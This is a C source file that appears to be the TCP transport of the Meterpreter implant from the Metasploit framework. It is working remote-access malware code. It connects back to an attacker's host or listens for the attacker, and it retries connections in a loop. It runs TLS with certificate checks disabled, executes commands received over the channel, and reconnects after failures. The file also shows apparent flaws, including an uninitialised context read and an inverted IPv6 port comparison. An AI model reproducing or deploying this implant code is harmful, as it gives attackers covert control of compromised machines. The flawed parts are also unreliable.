/*!
 * @file server_transport_tcp.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <ws2tcpip.h>

// These fields aren't defined unless the SDK version is set to something old enough.
// So we define them here instead of dancing with SDK versions, allowing us to move on
// and still support older versions of Windows.
#ifndef IPPROTO_IPV6
#define IPPROTO_IPV6 41
#endif
#ifndef in6addr_any
extern IN6_ADDR in6addr_any;
#endif

/*!
 * @brief Number of milliseconds to wait before connection retries.
 * @remark This will soon become configurable.
 */
const DWORD RETRY_TIMEOUT_MS = 5000;

/*! @brief An array of locks for use by OpenSSL. */
static LOCK ** ssl_locks = NULL;

/*!
 * @brief Perform the reverse_tcp connect.
 * @param reverseSocket The existing socket that refers to the remote host connection, closed on failure.
 * @param sockAddr The SOCKADDR structure which contains details of the connection.
 * @param sockAddrSize The size of the \c sockAddr structure.
 * @param retryAttempts The number of times to retry the connection (-1 == INFINITE).
 * @param retryTimeout The number of milliseconds to wait for each connection attempt.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, int retryAttempts, DWORD retryTimeout)
{
	DWORD result = ERROR_SUCCESS;
	do
	{
		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
		{
			break;
		}

		Sleep(retryTimeout);
	} while (retryAttempts == -1 || retryAttempts-- > 0);

	if (result == SOCKET_ERROR)
	{
		closesocket(reverseSocket);
	}

	return result;
}

/*!
 * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param port Port number to connect to.
 * @param retryAttempts The number of times to attempt to retry.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent* target = gethostbyname(host);
	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);

	SOCKADDR_IN sock = { 0 };
	sock.sin_addr.s_addr = inet_addr(targetIp);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryAttempts, RETRY_TIMEOUT_MS);

	if (result == ERROR_SUCCESS)
	{
		*socketBuffer = socketHandle;
	}

	return result;
}

/*!
 * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param service The target service/port.
 * @param scopeId IPv6 scope ID.
 * @param retryAttempts The number of times to attempt to retry.
 * @return Indication of success or failure.
 */
static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short retryAttempts, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	ADDRINFO hints = { 0 };
	hints.ai_family = AF_INET6;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	LPADDRINFO addresses;
	if (getaddrinfo(host, service, &hints, &addresses) != 0)
	{
		return WSAGetLastError();
	}

	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (socketHandle == INVALID_SOCKET)
	{
		dprintf("[STAGELESS IPV6] failed to connect to attacker");
		return WSAGetLastError();
	}

	DWORD result = ERROR_SUCCESS;
	do
	{
		for (LPADDRINFO address = addresses; address != NULL; address = address->ai_next)
		{
			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;

			if ((result = connect(socketHandle, address->ai_addr, (int)address->ai_addrlen)) != SOCKET_ERROR)
			{
				dprintf("[STAGELESS IPV6] Socket successfully connected");
				*socketBuffer = socketHandle;
				freeaddrinfo(addresses);
				return ERROR_SUCCESS;
			}
		}

		Sleep(RETRY_TIMEOUT_MS);
	} while (retryAttempts == -1 || retryAttempts-- > 0);

	closesocket(socketHandle);
	freeaddrinfo(addresses);

	return result;
}

/*!
 * @brief Perform the bind_tcp process.
 * @param listenSocket The existing listen socket that refers to the remote host connection, closed before returning.
 * @param sockAddr The SOCKADDR structure which contains details of the connection.
 * @param sockAddrSize The size of the \c sockAddr structure.
 * @param acceptSocketBuffer Buffer that will receive the accepted socket handle on success.
 * @return Indication of success or failure.
 */
static DWORD bind_tcp_run(SOCKET listenSocket, SOCKADDR* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
{
	DWORD result = ERROR_SUCCESS;
	do
	{
		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
		{
			result = WSAGetLastError();
			break;
		}

		if (listen(listenSocket, 1) == SOCKET_ERROR)
		{
			result = WSAGetLastError();
			break;
		}

		// Setup, ready to go, now wait for the connection.
		SOCKET acceptSocket = accept(listenSocket, NULL, NULL);

		if (acceptSocket == INVALID_SOCKET)
		{
			result = WSAGetLastError();
			break;
		}

		*acceptSocketBuffer = acceptSocket;
	} while (0);

	closesocket(listenSocket);

	return result;
}

/*!
 * @brief Listens on a port for an incoming payload request.
 * @param port Port number to listen on.
 * @param socketBuffer Pointer to the variable that will recieve the socket file descriptor.
 * @return Indication of success or failure.
 */
static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}


	// prepare a connection listener for the attacker to connect to, and we
	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
	// only if the process fails.
	BOOL v4Fallback = FALSE;
	SOCKET listenSocket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (listenSocket == INVALID_SOCKET)
	{
		dprintf("[BIND] Unable to create IPv6 socket");
		v4Fallback = TRUE;
	}
	else
	{
		int no = 0;
		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
		{
			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
			// so instead, we'll just revert back to v4 and listen on that one address instead.
			dprintf("[BIND] Unable to remove IPV6_ONLY option");
			closesocket(listenSocket);
			v4Fallback = TRUE;
		}
	}

	if (v4Fallback)
	{
		dprintf("[BIND] Falling back to IPV4");
		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	}

	struct sockaddr_in6 sockAddr = { 0 };

	if (v4Fallback)
	{
		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
		v4Addr->sin_family = AF_INET;
		v4Addr->sin_port = htons(port);
	}
	else
	{
		sockAddr.sin6_addr = in6addr_any;
		sockAddr.sin6_family = AF_INET6;
		sockAddr.sin6_port = htons(port);
	}

	return bind_tcp_run(listenSocket, (SOCKADDR*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
}

/*!
 * @brief A callback function used by OpenSSL to leverage native system locks.
 * @param mode The lock mode to set.
 * @param type The lock type to operate on.
 * @param file Unused.
 * @param line Unused.
 */
static VOID server_locking_callback(int mode, int type, const char * file, int line)
{
	if (mode & CRYPTO_LOCK)
	{
		lock_acquire(ssl_locks[type]);
	}
	else
	{
		lock_release(ssl_locks[type]);
	}
}

/*!
 * @brief A callback function used by OpenSSL to get the current threads id.
 * @returns The current thread ID.
 * @remarks While not needed on windows this must be used for posix meterpreter.
 */
static long unsigned int server_threadid_callback(VOID)
{
	return GetCurrentThreadId();
}

/*!
 * @brief A callback function for dynamic lock creation for OpenSSL.
 * @returns A pointer to a lock that can be used for synchronisation.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static struct CRYPTO_dynlock_value* server_dynamiclock_create(const char * file, int line)
{
	return (struct CRYPTO_dynlock_value*)lock_create();
}

/*!
 * @brief A callback function for dynamic lock locking for OpenSSL.
 * @param mode A bitmask which indicates the lock mode.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value* l, const char* file, int line)
{
	LOCK* lock = (LOCK *)l;

	if (mode & CRYPTO_LOCK)
	{
		lock_acquire(lock);
	}
	else
	{
		lock_release(lock);
	}
}

/*!
 * @brief A callback function for dynamic lock destruction for OpenSSL.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const char * file, int line)
{
	lock_destroy((LOCK*)l);
}

/*!
 * @brief Flush all pending data on the connected socket before doing SSL.
 * @param remote Pointer to the remote instance.
 */
static VOID server_socket_flush(Remote* remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	fd_set fdread;
	DWORD ret;
	char buff[4096];

	lock_acquire(remote->lock);

	while (1)
	{
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(ctx->fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec = 1;
		tv.tv_usec = 0;

		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
		if (data == 0)
		{
			break;
		}

		ret = recv(ctx->fd, buff, sizeof(buff), 0);
		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);

		// The socket closed while we waited
		if (ret == 0)
		{
			break;
		}
		continue;
	}

	lock_release(remote->lock);
}

/*!
 * @brief Poll a socket for data to recv and block when none available.
 * @param remote Pointer to the remote instance.
 * @param timeout Amount of time to wait before the poll times out.
 * @return Indication of success or failure.
 */
static LONG server_socket_poll(Remote* remote, long timeout)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	struct timeval tv;
	LONG result;
	fd_set fdread;

	lock_acquire(remote->lock);

	FD_ZERO(&fdread);
	FD_SET(ctx->fd, &fdread);

	tv.tv_sec = 0;
	tv.tv_usec = timeout;

	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);

	lock_release(remote->lock);

	return result;
}

/*!
 * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
static BOOL server_initialize_ssl(Remote* remote)
{
	int i = 0;

	lock_acquire(remote->lock);

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = (LOCK**)malloc(CRYPTO_num_locks() * sizeof(LOCK *));
	if (ssl_locks == NULL)
	{
		lock_release(remote->lock);
		return FALSE;
	}

	for (i = 0; i < CRYPTO_num_locks(); i++)
	{
		ssl_locks[i] = lock_create();
	}

	CRYPTO_set_id_callback(server_threadid_callback);
	CRYPTO_set_locking_callback(server_locking_callback);
	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);

	lock_release(remote->lock);

	return TRUE;
}

/*!
 * @brief Bring down the OpenSSL subsystem
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
static BOOL server_destroy_ssl(Remote* remote)
{
	int i = 0;
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	dprintf("[SERVER] Destroying SSL");

	lock_acquire(remote->lock);

	SSL_free(ctx->ssl);

	SSL_CTX_free(ctx->ctx);

	CRYPTO_set_locking_callback(NULL);
	CRYPTO_set_id_callback(NULL);
	CRYPTO_set_dynlock_create_callback(NULL);
	CRYPTO_set_dynlock_lock_callback(NULL);
	CRYPTO_set_dynlock_destroy_callback(NULL);

	for (i = 0; i < CRYPTO_num_locks(); i++)
	{
		lock_destroy(ssl_locks[i]);
	}

	free(ssl_locks);

	lock_release(remote->lock);

	return TRUE;
}

/*!
 * @brief Negotiate SSL on the socket.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
static BOOL server_negotiate_ssl(Remote *remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	BOOL success = TRUE;
	SOCKET fd = 0;
	DWORD ret = 0;
	DWORD res = 0;

	lock_acquire(remote->lock);

	do
	{
		ctx->meth = TLSv1_client_method();

		ctx->ctx = SSL_CTX_new(ctx->meth);
		SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);

		ctx->ssl = SSL_new(ctx->ctx);
		SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);

		if (SSL_set_fd(ctx->ssl, (int)ctx->fd) == 0)
		{
			dprintf("[SERVER] set fd failed");
			success = FALSE;
			break;
		}

		do
		{
			if ((ret = SSL_connect(ctx->ssl)) != 1)
			{
				res = SSL_get_error(ctx->ssl, ret);
				dprintf("[SERVER] connect failed %d", res);

				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE)
				{
					// Catch non-blocking socket errors and retry
					continue;
				}

				success = FALSE;
				break;
			}
		} while (ret != 1);

		if (success == FALSE) break;

		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");

		if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0)
		{
			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(ctx->ssl, ret));
		}

	} while (0);

	lock_release(remote->lock);

	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);

	if (ret < 0)
	{
		success = FALSE;
	}

	return success;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;

	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	while (running)
	{
		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		result = server_socket_poll(remote, 100);
		if (result > 0)
		{
			result = remote->transport->packet_receive(remote, &packet);
			if (result != ERROR_SUCCESS)
			{
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}

			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
		}
		else if (result < 0)
		{
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

/*!
 * @brief Destroy the tcp transport.
 * @param transport Pointer to the TCP transport containing the socket.
 * @return The current transport socket FD, if any, or zero.
 */
static SOCKET transport_get_socket_tcp(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
	{
		return ((TcpTransportContext*)transport->ctx)->fd;
	}

	return 0;
}

/*!
 * @brief Destroy the TCP transport.
 * @param transport Pointer to the TCP transport to reset.
 */
static void transport_destroy_tcp(Remote* remote)
{
	if (remote && remote->transport && remote->transport->type == METERPRETER_TRANSPORT_SSL)
	{
		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
		SAFE_FREE(remote->transport->url);
		SAFE_FREE(remote->transport->ctx);
		SAFE_FREE(remote->transport);
	}
}

/*!
 * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
 * @param transport Pointer to the TCP transport to reset.
 */
static void transport_reset_tcp(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
	{
		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
		if (ctx->fd)
		{
			closesocket(ctx->fd);
		}
		ctx->fd = 0;
	}
}

/*!
 * @brief Attempt to determine if the stager connection was a bind or reverse connection.
 * @param ctx Pointer to the current \c TcpTransportContext.
 * @param sock The socket file descriptor passed in to metsrv.
 * @remark This function always "succeeds" because the fallback case is reverse_tcp.
 */
static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
{
	// if we get here it means that we've been given a socket from the stager. So we need to stash
	// that in our context. Once we've done that, we need to attempt to infer whether this conn
	// was created via reverse or bind, so that we can do the same thing later on if the transport
	// fails for some reason.
	SOCKET listenSocket;

	ctx->fd = sock;

	// default to reverse socket
	ctx->bound = FALSE;

	// for sockets that were handed over to us, we need to persist some information about it so that
	// we can reconnect after failure. To support this, we need to first get the socket information
	// which gives us addresses and port information
	ctx->sock_desc_size = sizeof(ctx->sock_desc);
	if (getsockname(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size) != SOCKET_ERROR)
	{
#ifdef DEBUGTRACE
		if (ctx->sock_desc.ss_family == AF_INET)
		{
			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
		}
		else
		{
			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
		}
#endif
	}
	else
	{
		dprintf("[STAGED] getsockname failed: %u (%x)", GetLastError(), GetLastError());
	}

	// then, to be horrible, we need to figure out the direction of the connection. To do this, we will
	// Loop backwards from our current socket FD number
	for (int i = 1; i <= 16; ++i)
	{
		// Windows socket handles are always multiples of 4 apart.
		listenSocket = ctx->fd - i * 4;

		vdprintf("[STAGED] Checking socket fd %u", listenSocket);

		BOOL isListening = FALSE;
		int isListeningLen = sizeof(isListening);
		if (getsockopt(listenSocket, SOL_SOCKET, SO_ACCEPTCONN, (char*)&isListening, &isListeningLen) == SOCKET_ERROR)
		{
			dprintf("[STAGED] Couldn't get socket option to see if socket was listening: %u %x", GetLastError(), GetLastError());
			continue;
		}

		if (!isListening)
		{
			dprintf("[STAGED] Socket appears to NOT be listening");
			continue;
		}

		// try to get details of the socket address
		struct sockaddr_storage listenStorage;
		int listenStorageSize = sizeof(listenStorage);
		if (getsockname(listenSocket, (struct sockaddr*)&listenStorage, &listenStorageSize) == SOCKET_ERROR)
		{
			vdprintf("[STAGED] Socket fd %u invalid: %u %x", listenSocket, GetLastError(), GetLastError());
			continue;
		}

		// on finding a socket, see if it matches the family of our current socket
		if (listenStorage.ss_family != ctx->sock_desc.ss_family)
		{
			vdprintf("[STAGED] Socket fd %u isn't the right family, it's %u", listenSocket, listenStorage.ss_family);
			continue;
		}

		// if it's the same, and we are on the same local port, we can assume that there's a bind listener
		if (listenStorage.ss_family == AF_INET)
		{
			if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
			{
				vdprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
				ctx->bound = TRUE;
				break;
			}
			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
		}
		else if (listenStorage.ss_family == AF_INET6)
		{
			if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
			{
				vdprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
				ctx->bound = TRUE;
				break;
			}
			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
		}
	}

	if (ctx->bound)
	{
		// store the details of the listen socket so that we can use it again
		ctx->sock_desc_size = sizeof(ctx->sock_desc);
		getsockname(listenSocket, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);

		// the listen socket that we have been given needs to be tidied up because
		// the stager doesn't do it
		closesocket(listenSocket);
	}
	else
	{
		// if we get here, we assume reverse_tcp, and so we need the peername data to connect back to
		vdprintf("[STAGED] Connection appears to be a reverse connection");
		ctx->sock_desc_size = sizeof(ctx->sock_desc);
		getpeername(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
#ifdef DEBUGTRACE
		if (ctx->sock_desc.ss_family == AF_INET)
		{
			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
		}
		else
		{
			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
		}
#endif
	}
}

/*!
 * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
 * @param remote Pointer to the remote instance with the TCP transport details wired in.
 * @param sock Reference to the original socket FD passed to metsrv.
 * @return Indication of success or failure.
 */
static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
{
	DWORD result = ERROR_SUCCESS;
	size_t charsConverted;
	char asciiUrl[512];
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), remote->transport->url, sizeof(asciiUrl)-1);

	if (strncmp(asciiUrl, "tcp", 3) == 0)
	{
		const int iRetryAttempts = 30;
		char* pHost = strstr(asciiUrl, "//") + 2;
		char* pPort = strrchr(pHost, ':') + 1;

		// check if we're using IPv6
		if (asciiUrl[3] == '6')
		{
			char* pScopeId = strrchr(pHost, '?') + 1;
			*(pScopeId - 1) = '\0';
			*(pPort - 1) = '\0';
			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
			result = reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, &ctx->fd);
		}
		else
		{
			u_short usPort = (u_short)atoi(pPort);

			// if no host is specified, then we can assume that this is a bind payload, otherwise
			// we'll assume that the payload is a reverse_tcp one and the given host is valid
			if (*pHost == ':')
			{
				dprintf("[STAGELESS] IPv4 bind port %s", pPort);
				result = bind_tcp(usPort, &ctx->fd);
			}
			else
			{
				*(pPort - 1) = '\0';
				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
				result = reverse_tcp4(pHost, usPort, iRetryAttempts, &ctx->fd);
			}
		}
	}
	else if (ctx->sock_desc_size > 0)
	{
		// if we have a value for the socket description size then we know that the socket
		// was originally created with a staged connection, and so we need to attempt to
		// recreate that this time around.
		int retryAttempts = 30;

		dprintf("[STAGED] Attempted to reconnect based on inference from previous staged connection");

		// check if we should do bind() or reverse()
		if (ctx->bound)
		{
			dprintf("[STAGED] previous connection was a bind connection");
			SOCKET listenSocket = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);

			result = bind_tcp_run(listenSocket, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size, &ctx->fd);
		}
		else
		{
			dprintf("[STAGED] previous connection was a reverse connection");
			ctx->fd = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);

			result = reverse_tcp_run(ctx->fd, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size, retryAttempts, RETRY_TIMEOUT_MS);

			if (result != ERROR_SUCCESS)
			{
				ctx->fd = 0;
			}
		}
	}
	else
	{
		// if we get here it means that we've been given a socket from the stager. So we need to stash
		// that in our context. Once we've done that, we need to attempt to infer whether this conn
		// was created via reverse or bind, so that we can do the same thing later on if the transport
		// fails for some reason.
		infer_staged_connection_type(ctx, sock);
	}

	if (result != ERROR_SUCCESS)
	{
		return FALSE;
	}

	// Do not allow the file descriptor to be inherited by child processes
	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);

	dprintf("[SERVER] Flushing the socket handle...");
	server_socket_flush(remote);

	dprintf("[SERVER] Initializing SSL...");
	if (!server_initialize_ssl(remote))
	{
		return FALSE;
	}

	dprintf("[SERVER] Negotiating SSL...");
	if (!server_negotiate_ssl(remote))
	{
		return FALSE;
	}

	return TRUE;
}

/*!
 * @brief Creates a new TCP transport instance.
 * @param url URL containing the transport details.
 * @return Pointer to the newly configured/created TCP transport instance.
 */
Transport* transport_create_tcp(wchar_t* url)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));

	dprintf("[TRANS TCP] Creating tcp transport for url %S", url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(TcpTransportContext));

	transport->url = _wcsdup(url);
	transport->packet_receive = packet_receive_via_ssl;
	transport->packet_transmit = packet_transmit_via_ssl;
	transport->transport_init = configure_tcp_connection;
	transport->transport_deinit = server_destroy_ssl;
	transport->transport_destroy = transport_destroy_tcp;
	transport->transport_reset = transport_reset_tcp;
	transport->server_dispatch = server_dispatch_tcp;
	transport->get_socket = transport_get_socket_tcp;
	transport->ctx = ctx;
	transport->type = METERPRETER_TRANSPORT_SSL;

	return transport;
}

